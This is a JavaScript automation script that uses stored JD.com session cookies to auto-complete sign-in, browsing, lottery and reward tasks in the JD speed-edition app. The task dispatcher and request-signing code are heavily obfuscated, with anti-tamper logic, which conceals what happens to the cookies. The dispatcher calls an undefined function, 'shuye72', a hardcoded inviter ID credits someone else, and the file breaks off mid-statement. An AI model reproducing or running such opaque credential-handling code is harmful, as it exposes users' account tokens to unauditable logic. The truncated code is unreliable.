/*
京东极速版签到+赚现金任务
每日9毛左右，满3，10，50可兑换无门槛红包
⚠️⚠️⚠️一个号需要运行40分钟左右

活动时间：长期
活动入口：京东极速版app-现金签到
原脚本作者：lxk0301
*/
const $ = new Env('京东极速版');
const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let cookiesArr = [], cookie = '', message;
let helpAuthor = true;
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {
  };
} else {
  cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
}
const JD_API_HOST = 'https://api.m.jd.com/', actCode = 'visa-card-001';


!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      message = '';
      await TotalBean();
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      await jdGlobal()
      await $.wait(2*1000)
    }
  }
})()
  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })

var _0xodd='jsjiami.com.v6',_0x1fc2=[_0xodd,'C8KIw7fChsKb','wql9wo9oDA==','UcOhQgwd','M8KzwrjDncK1','YUTDok1D','w4rCmyF/w50=','esOuwqbDosOW','wrXClMKOYEU=','XMKXVBgmPQ==','YsOnWQBxIsOqw59owqM6bhbChzh6YU/ChFcgw58wwqbCs8Ktw5Y2wp/DhcOI','R8OcVxEv','w4fCqXMjUw==','w7XCtsOaJiQ=','w4PDlwtXLQ==','J8K5UVhh','Z8OnYiTCvQ==','X8OEwrXDr8OU','w7tiGFnCgg==','NhufjCVsjiaQyImi.OBZcom.v6=='];(function(_0x3e77da,_0x224067,_0x3f96c3){var _0x25bff7=function(_0x1642c0,_0x31c3e7,_0x305d62,_0x382dc0,_0x12019a){_0x31c3e7=_0x31c3e7>>0x8,_0x12019a='po';var _0x20bdb2='shift',_0x591758='push';if(_0x31c3e7<_0x1642c0){while(--_0x1642c0){_0x382dc0=_0x3e77da[_0x20bdb2]();if(_0x31c3e7===_0x1642c0){_0x31c3e7=_0x382dc0;_0x305d62=_0x3e77da[_0x12019a+'p']();}else if(_0x31c3e7&&_0x305d62['replace'](/[NhufCVQyIOBZ=]/g,'')===_0x31c3e7){_0x3e77da[_0x591758](_0x382dc0);}}_0x3e77da[_0x591758](_0x3e77da[_0x20bdb2]());}return 0x779b2;};var _0x524bdc=function(){var _0x3c3fe6={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0xe4e5c0,_0x42b1c5,_0x1d14c8,_0x1ddf6f){_0x1ddf6f=_0x1ddf6f||{};var _0x593195=_0x42b1c5+'='+_0x1d14c8;var _0x5a7a63=0x0;for(var _0x5a7a63=0x0,_0x248d08=_0xe4e5c0['length'];_0x5a7a63<_0x248d08;_0x5a7a63++){var _0x1adad1=_0xe4e5c0[_0x5a7a63];_0x593195+=';\x20'+_0x1adad1;var _0x45d99a=_0xe4e5c0[_0x1adad1];_0xe4e5c0['push'](_0x45d99a);_0x248d08=_0xe4e5c0['length'];if(_0x45d99a!==!![]){_0x593195+='='+_0x45d99a;}}_0x1ddf6f['cookie']=_0x593195;},'removeCookie':function(){return'dev';},'getCookie':function(_0x1da69a,_0x4406f3){_0x1da69a=_0x1da69a||function(_0x2d2c27){return _0x2d2c27;};var _0x24f8c5=_0x1da69a(new RegExp('(?:^|;\x20)'+_0x4406f3['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x3067f2=function(_0x59c465,_0x5c4a97,_0x489522){_0x59c465(++_0x5c4a97,_0x489522);};_0x3067f2(_0x25bff7,_0x224067,_0x3f96c3);return _0x24f8c5?decodeURIComponent(_0x24f8c5[0x1]):undefined;}};var _0x2ab66b=function(){var _0x3a8556=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x3a8556['test'](_0x3c3fe6['removeCookie']['toString']());};_0x3c3fe6['updateCookie']=_0x2ab66b;var _0x5eb038='';var _0x573bfe=_0x3c3fe6['updateCookie']();if(!_0x573bfe){_0x3c3fe6['setCookie'](['*'],'counter',0x1);}else if(_0x573bfe){_0x5eb038=_0x3c3fe6['getCookie'](null,'counter');}else{_0x3c3fe6['removeCookie']();}};_0x524bdc();}(_0x1fc2,0x14d,0x14d00));var _0x467c=function(_0xbf30cc,_0x19b78f){_0xbf30cc=~~'0x'['concat'](_0xbf30cc);var _0x5edb3a=_0x1fc2[_0xbf30cc];if(_0x467c['RTWqzK']===undefined){(function(){var _0xebc0dc;try{var _0x13fece=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0xebc0dc=_0x13fece();}catch(_0x9d5aed){_0xebc0dc=window;}var _0x3139ef='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0xebc0dc['atob']||(_0xebc0dc['atob']=function(_0x31a3e9){var _0x3f0bce=String(_0x31a3e9)['replace'](/=+$/,'');for(var _0xa6f8a1=0x0,_0xc5406a,_0x34fa5d,_0x496c06=0x0,_0x157bd2='';_0x34fa5d=_0x3f0bce['charAt'](_0x496c06++);~_0x34fa5d&&(_0xc5406a=_0xa6f8a1%0x4?_0xc5406a*0x40+_0x34fa5d:_0x34fa5d,_0xa6f8a1++%0x4)?_0x157bd2+=String['fromCharCode'](0xff&_0xc5406a>>(-0x2*_0xa6f8a1&0x6)):0x0){_0x34fa5d=_0x3139ef['indexOf'](_0x34fa5d);}return _0x157bd2;});}());var _0x141849=function(_0x516d0a,_0x19b78f){var _0x5468d8=[],_0x76abcc=0x0,_0xaa3872,_0x3327a1='',_0x26b66c='';_0x516d0a=atob(_0x516d0a);for(var _0x115bf1=0x0,_0x40afb8=_0x516d0a['length'];_0x115bf1<_0x40afb8;_0x115bf1++){_0x26b66c+='%'+('00'+_0x516d0a['charCodeAt'](_0x115bf1)['toString'](0x10))['slice'](-0x2);}_0x516d0a=decodeURIComponent(_0x26b66c);for(var _0x421570=0x0;_0x421570<0x100;_0x421570++){_0x5468d8[_0x421570]=_0x421570;}for(_0x421570=0x0;_0x421570<0x100;_0x421570++){_0x76abcc=(_0x76abcc+_0x5468d8[_0x421570]+_0x19b78f['charCodeAt'](_0x421570%_0x19b78f['length']))%0x100;_0xaa3872=_0x5468d8[_0x421570];_0x5468d8[_0x421570]=_0x5468d8[_0x76abcc];_0x5468d8[_0x76abcc]=_0xaa3872;}_0x421570=0x0;_0x76abcc=0x0;for(var _0x74cb17=0x0;_0x74cb17<_0x516d0a['length'];_0x74cb17++){_0x421570=(_0x421570+0x1)%0x100;_0x76abcc=(_0x76abcc+_0x5468d8[_0x421570])%0x100;_0xaa3872=_0x5468d8[_0x421570];_0x5468d8[_0x421570]=_0x5468d8[_0x76abcc];_0x5468d8[_0x76abcc]=_0xaa3872;_0x3327a1+=String['fromCharCode'](_0x516d0a['charCodeAt'](_0x74cb17)^_0x5468d8[(_0x5468d8[_0x421570]+_0x5468d8[_0x76abcc])%0x100]);}return _0x3327a1;};_0x467c['yQxhZx']=_0x141849;_0x467c['fzgPHJ']={};_0x467c['RTWqzK']=!![];}var _0x1ce4b0=_0x467c['fzgPHJ'][_0xbf30cc];if(_0x1ce4b0===undefined){if(_0x467c['xPnElz']===undefined){var _0x227ecf=function(_0x2a02d6){this['WXgMWC']=_0x2a02d6;this['AHNXdM']=[0x1,0x0,0x0];this['ySQysW']=function(){return'newState';};this['XuMDFC']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['sBidEY']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x227ecf['prototype']['yAGryi']=function(){var _0x55533e=new RegExp(this['XuMDFC']+this['sBidEY']);var _0x596578=_0x55533e['test'](this['ySQysW']['toString']())?--this['AHNXdM'][0x1]:--this['AHNXdM'][0x0];return this['DhATFb'](_0x596578);};_0x227ecf['prototype']['DhATFb']=function(_0x1f261c){if(!Boolean(~_0x1f261c)){return _0x1f261c;}return this['brUgDS'](this['WXgMWC']);};_0x227ecf['prototype']['brUgDS']=function(_0x592505){for(var _0x60f98=0x0,_0x1e02ea=this['AHNXdM']['length'];_0x60f98<_0x1e02ea;_0x60f98++){this['AHNXdM']['push'](Math['round'](Math['random']()));_0x1e02ea=this['AHNXdM']['length'];}return _0x592505(this['AHNXdM'][0x0]);};new _0x227ecf(_0x467c)['yAGryi']();_0x467c['xPnElz']=!![];}_0x5edb3a=_0x467c['yQxhZx'](_0x5edb3a,_0x19b78f);_0x467c['fzgPHJ'][_0xbf30cc]=_0x5edb3a;}else{_0x5edb3a=_0x1ce4b0;}return _0x5edb3a;};var _0xe739f1=function(){var _0x5f568d=!![];return function(_0x5b269e,_0xa7d403){var _0x3f4e6b=_0x5f568d?function(){if(_0xa7d403){var _0x193be3=_0xa7d403['apply'](_0x5b269e,arguments);_0xa7d403=null;return _0x193be3;}}:function(){};_0x5f568d=![];return _0x3f4e6b;};}();var _0x21d8d6=_0xe739f1(this,function(){var _0x5416cb=function(){return'\x64\x65\x76';},_0x12c682=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x2d6717=function(){var _0x4ce516=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x4ce516['\x74\x65\x73\x74'](_0x5416cb['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x47061f=function(){var _0x411442=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x411442['\x74\x65\x73\x74'](_0x12c682['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x469b70=function(_0x394752){var _0x72fcc7=~-0x1>>0x1+0xff%0x0;if(_0x394752['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x72fcc7)){_0x5cbe39(_0x394752);}};var _0x5cbe39=function(_0x1328e9){var _0x437db7=~-0x4>>0x1+0xff%0x0;if(_0x1328e9['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x437db7){_0x469b70(_0x1328e9);}};if(!_0x2d6717()){if(!_0x47061f()){_0x469b70('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x469b70('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x469b70('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x21d8d6();async function jdGlobal(){var _0x2de68d={'FdPQt':_0x467c('0','FxyU'),'HcHnK':function(_0xf6d79e){return _0xf6d79e();},'kevfN':function(_0x586573){return _0x586573();},'htgob':function(_0xf107a4){return _0xf107a4();},'PYELF':function(_0x22404f){return _0x22404f();},'pJlQs':function(_0x2259f5){return _0x2259f5();},'NOekL':function(_0x19aeef){return _0x19aeef();},'qFejK':function(_0x31a932){return _0x31a932();}};try{var _0x170bb8=_0x2de68d[_0x467c('1','anh*')][_0x467c('2','r^qN')]('|'),_0x2c171b=0x0;while(!![]){switch(_0x170bb8[_0x2c171b++]){case'0':await _0x2de68d[_0x467c('3','pJn^')](wheelsHome);continue;case'1':$[_0x467c('4',']2UM')]=0x0;continue;case'2':$[_0x467c('5','FxyU')]=0x0;continue;case'3':await _0x2de68d[_0x467c('6','MKKg')](showMsg);continue;case'4':await _0x2de68d[_0x467c('7','(9K5')](taskList);continue;case'5':await _0x2de68d[_0x467c('8','LQD^')](apTaskList);continue;case'6':await _0x2de68d[_0x467c('9','GVo4')](signInit);continue;case'7':await _0x2de68d[_0x467c('a','2v5b')](cash);continue;case'8':await _0x2de68d[_0x467c('b','anh*')](wheelsHome);continue;case'9':await _0x2de68d[_0x467c('c','u07z')](richManIndex);continue;case'10':await _0x2de68d[_0x467c('d','8oYO')](signInit);continue;case'11':await _0x2de68d[_0x467c('e','Hn]m')](shuye72);continue;case'12':await _0x2de68d[_0x467c('f','(9K5')](sign);continue;case'13':await _0x2de68d[_0x467c('10','08]j')](queryJoy);continue;}break;}}catch(_0x43a2ee){$[_0x467c('11','&6tR')](_0x43a2ee);}};_0xodd='jsjiami.com.v6';


function showMsg() {
  return new Promise(resolve => {
    message += `本次运行获得${$.score}金币，共计${$.total}金币`
    $.msg($.name, '', `京东账号${$.index}${$.nickName}\n${message}`);
    resolve()
  })
}

async function signInit() {
  return new Promise(resolve => {
    $.get(taskUrl('speedSignInit', {
      "activityId": "8a8fabf3cccb417f8e691b6774938bc2",
      "kernelPlatform": "RN",
      "inviterId":"DNfaRn46j3w7TR4On8bJjlhOf"
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            //console.log(data)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function sign() {
  return new Promise(resolve => {
    $.get(taskUrl('speedSign', {
        "kernelPlatform": "RN",
        "activityId": "8a8fabf3cccb417f8e691b6774938bc2",
        "noWaitPrize": "false"
      }),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if (data.subCode === 0) {
                console.log(`签到获得${data.data.signAmount}现金，共计获得${data.data.cashDrawAmount}`)
              } else {
                console.log(`签到失败，${data.msg}`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

async function taskList() {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
        "version": "3.1.0",
        "method": "newTaskCenterPage",
        "data": {"channel": 1}
      }),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              for (let task of data.data) {
                $.taskName = task.taskInfo.mainTitle
                if (task.taskInfo.status === 0) {
                  if (task.taskType >= 1000) {
                    await doTask(task.taskType)
                    await $.wait(1000)
                  } else {
                    $.canStartNewItem = true
                    while ($.canStartNewItem) {
                      if (task.taskType !== 3) {
                        await queryItem(task.taskType)
                      } else {
                        await startItem("", task.taskType)
                      }
                    }
                  }
                } else {
                  console.log(`${task.taskInfo.mainTitle}已完成`)
                }
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

async function doTask(taskId) {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
      "method": "marketTaskRewardPayment",
      "data": {"channel": 1, "clientTime": +new Date() + 0.588, "activeType": taskId}
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0) {
              console.log(`${data.data.taskInfo.mainTitle}任务完成成功，预计获得${data.data.reward}金币`)
            } else {
              console.log(`任务完成失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function queryJoy() {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {"method": "queryJoyPage", "data": {"channel": 1}}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if (data.data.taskBubbles)
                for (let task of data.data.taskBubbles) {
                  await rewardTask(task.id, task.activeType)
                  await $.wait(500)
                }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

async function rewardTask(id, taskId) {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
      "method": "joyTaskReward",
      "data": {"id": id, "channel": 1, "clientTime": +new Date() + 0.588, "activeType": taskId}
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0) {
              $.score += data.data.reward
              console.log(`气泡收取成功，获得${data.data.reward}金币`)
            } else {
              console.log(`气泡收取失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}


async function queryItem(activeType = 1) {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
      "method": "queryNextTask",
      "data": {"channel": 1, "activeType": activeType}
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0 && data.data) {
              await startItem(data.data.nextResource, activeType)
            } else {
              console.log(`商品任务开启失败，${data.message}`)
              $.canStartNewItem = false
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function startItem(activeId, activeType) {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
      "method": "enterAndLeave",
      "data": {
        "activeId": activeId,
        "clientTime": +new Date(),
        "channel": "1",
        "messageType": "1",
        "activeType": activeType,
      }
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0 && data.data) {
              if (data.data.taskInfo.isTaskLimit === 0) {
                let {videoBrowsing, taskCompletionProgress, taskCompletionLimit} = data.data.taskInfo
                if (activeType !== 3)
                  videoBrowsing = activeType === 1 ? 5 : 10
                console.log(`【${taskCompletionProgress + 1}/${taskCompletionLimit}】浏览商品任务记录成功，等待${videoBrowsing}秒`)
                await $.wait(videoBrowsing * 1000)
                await endItem(data.data.uuid, activeType, activeId, activeType === 3 ? videoBrowsing : "")
              } else {
                console.log(`${$.taskName}任务已达上限`)
                $.canStartNewItem = false
              }
            } else {
              $.canStartNewItem = false
              console.log(`${$.taskName}任务开启失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function endItem(uuid, activeType, activeId = "", videoTimeLength = "") {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute',
      {
        "method": "enterAndLeave",
        "data": {
          "channel": "1",
          "clientTime": +new Date(),
          "uuid": uuid,
          "videoTimeLength": videoTimeLength,
          "messageType": "2",
          "activeType": activeType,
          "activeId": activeId
        }
      }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0 && data.isSuccess) {
              await rewardItem(uuid, activeType, activeId, videoTimeLength)
            } else {
              console.log(`${$.taskName}任务结束失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function rewardItem(uuid, activeType, activeId = "", videoTimeLength = "") {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute',
      {
        "method": "rewardPayment",
        "data": {
          "channel": "1",
          "clientTime": +new Date(),
          "uuid": uuid,
          "videoTimeLength": videoTimeLength,
          "messageType": "2",
          "activeType": activeType,
          "activeId": activeId
        }
      }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0 && data.isSuccess) {
              $.score += data.data.reward
              console.log(`${$.taskName}任务完成，获得${data.data.reward}金币`)
            } else {
              console.log(`${$.taskName}任务失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function cash() {
  return new Promise(resolve => {
    $.get(taskUrl('MyAssetsService.execute',
      {"method": "userCashRecord", "data": {"channel": 1, "pageNum": 1, "pageSize": 20}}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              $.total = data.data.goldBalance
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

// 大转盘
function wheelsHome() {
  return new Promise(resolve => {
    $.get(taskGetUrl('wheelsHome',
      {"linkId":"toxw9c5sy9xllGBr3QFdYg"}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if(data.code ===0){
                console.log(`【幸运大转盘】剩余抽奖机会：${data.data.lotteryChances}`)
                while(data.data.lotteryChances--) {
                  await wheelsLottery()
                  await $.wait(500)
                }
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}
// 大转盘
function wheelsLottery() {
  return new Promise(resolve => {
    $.get(taskGetUrl('wheelsLottery',
      {"linkId":"toxw9c5sy9xllGBr3QFdYg"}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if(data.data && data.data.rewardType){
                console.log(`幸运大转盘抽奖获得：【${data.data.couponUsedValue}-${data.data.rewardValue}${data.data.couponDesc}】\n`)
                message += `幸运大转盘抽奖获得：【${data.data.couponUsedValue}-${data.data.rewardValue}${data.data.couponDesc}】\n`
              }else{
                console.log(`幸运大转盘抽奖获得：空气`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}
// 大转盘任务
function apTaskList() {
  return new Promise(resolve => {
    $.get(taskGetUrl('apTaskList',
      {"linkId":"toxw9c5sy9xllGBr3QFdYg"}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if(data.code ===0){
                for(let task of data.data){
                  // {"linkId":"toxw9c5sy9xllGBr3QFdYg","taskType":"SIGN","taskId":67,"channel":4}
                  if(!task.taskFinished && ['SIGN','BROWSE_CHANNEL'].includes(task.taskType)){
                    console.log(`去做任务${task.taskTitle}`)
                    await apDoTask(task.taskType,task.id,4,task.taskSourceUrl)
                  }
                }
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}
// 大转盘做任务
function apDoTask(taskType,taskId,channel,itemId) {
  // console.log({"linkId":"toxw9c5sy9xllGBr3QFdYg","taskType":taskType,"taskId":taskId,"channel":channel,"itemId":itemId})
  return new Promise(resolve => {
    $.get(taskGetUrl('apDoTask',
      {"linkId":"toxw9c5sy9xllGBr3QFdYg","taskType":taskType,"taskId":taskId,"channel":channel,"itemId":itemId}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if(data.code ===0 && data.data && data.data.finished){
                console.log(`任务完成成功`)
              }else{
                console.log(JSON.stringify(data))
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}
// 红包大富翁
function richManIndex() {
  return new Promise(resolve => {
    $.get(taskUrl('richManIndex', {"actId":"hbdfw","needGoldToast":"true"}), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if(data.code ===0 && data.data && data.data.userInfo){
              console.log(`用户当前位置：${data.data.userInfo.position}，剩余机会：${data.data.userInfo.randomTimes}`)
              while(data.data.userInfo.randomTimes--){
                await shootRichManDice()
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
// 红包大富翁
function shootRichManDice() {
  return new Promise(resolve => {
    $.get(taskUrl('shootRichManDice', {"actId":"hbdfw"}), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if(data.code ===0 && data.data && data.data.rewardType && data.data.couponDesc){
              message += `红包大富翁抽奖获得：【${data.data.couponUsedValue}-${data.data.rewardValue} ${data.data.poolName}】\n`
              console.log(`红包大富翁抽奖获得：【${data.data.couponUsedValue}-${data.data.rewardValue} ${data.data.poolName}】`)
            }else{
              console.log(`红包大富翁抽奖：获得空气`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb24bc=["\x6C\x69\x74\x65\x2D\x61\x6E\x64\x72\x6F\x69\x64\x26","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x26\x61\x6E\x64\x72\x6F\x69\x64\x26\x33\x2E\x31\x2E\x30\x26","\x26","\x26\x38\x34\x36\x63\x34\x63\x33\x32\x64\x61\x65\x39\x31\x30\x65\x66","\x31\x32\x61\x65\x61\x36\x35\x38\x66\x37\x36\x65\x34\x35\x33\x66\x61\x66\x38\x30\x33\x64\x31\x35\x63\x34\x30\x61\x37\x32\x65\x30","\x69\x73\x4E\x6F\x64\x65","\x63\x72\x79\x70\x74\x6F\x2D\x6A\x73","","\x61\x70\x69\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x62\x6F\x64\x79\x3D","\x26\x61\x70\x70\x69\x64\x3D\x6C\x69\x74\x65\x2D\x61\x6E\x64\x72\x6F\x69\x64\x26\x63\x6C\x69\x65\x6E\x74\x3D\x61\x6E\x64\x72\x6F\x69\x64\x26\x75\x75\x69\x64\x3D\x38\x34\x36\x63\x34\x63\x33\x32\x64\x61\x65\x39\x31\x30\x65\x66\x26\x63\x6C\x69\x65\x6E\x74\x56\x65\x72\x73\x69\x6F\x6E\x3D\x33\x2E\x31\x2E\x30\x26\x74\x3D","\x26\x73\x69\x67\x6E\x3D","\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x2A\x2F\x2A","\x52\x4E","\x4A\x44\x4D\x6F\x62\x69\x6C\x65\x4C\x69\x74\x65\x2F\x33\x2E\x31\x2E\x30\x20\x28\x69\x50\x61\x64\x3B\x20\x69\x4F\x53\x20\x31\x34\x2E\x34\x3B\x20\x53\x63\x61\x6C\x65\x2F\x32\x2E\x30\x30\x29","\x7A\x68\x2D\x48\x61\x6E\x73\x2D\x43\x4E\x3B\x71\x3D\x31\x2C\x20\x6A\x61\x2D\x43\x4E\x3B\x71\x3D\x30\x2E\x39","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function taskUrl(_0x7683x2,_0x7683x3= {}){let _0x7683x4=+ new Date();let 